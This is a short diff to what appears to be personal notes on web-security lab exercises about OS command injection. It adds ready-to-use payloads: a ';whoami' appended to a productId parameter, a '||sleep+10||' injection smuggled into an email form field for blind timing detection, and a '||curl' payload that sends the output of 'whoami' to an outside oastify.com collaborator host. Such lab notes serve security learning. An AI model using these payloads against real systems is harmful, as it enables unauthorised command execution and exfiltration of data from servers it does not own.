@@ -32,3 +32,12 @@ https://www.youtube.com/watch?v=o7oVWXw4t5E
 productId=3&storeId=1;whoami
 ```
 
+# Blind OS command injection with time delays
+
+```bash
+csrf=MHUzDCRAmx3TG1QrDY2ZLHl2jHKiuHJg&name=test&email=test%40test.com||sleep+10||&subject=test&message=test
+```
+
+```bash
+email=carlos@exam.net||curl+`whoami`.ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||
+```
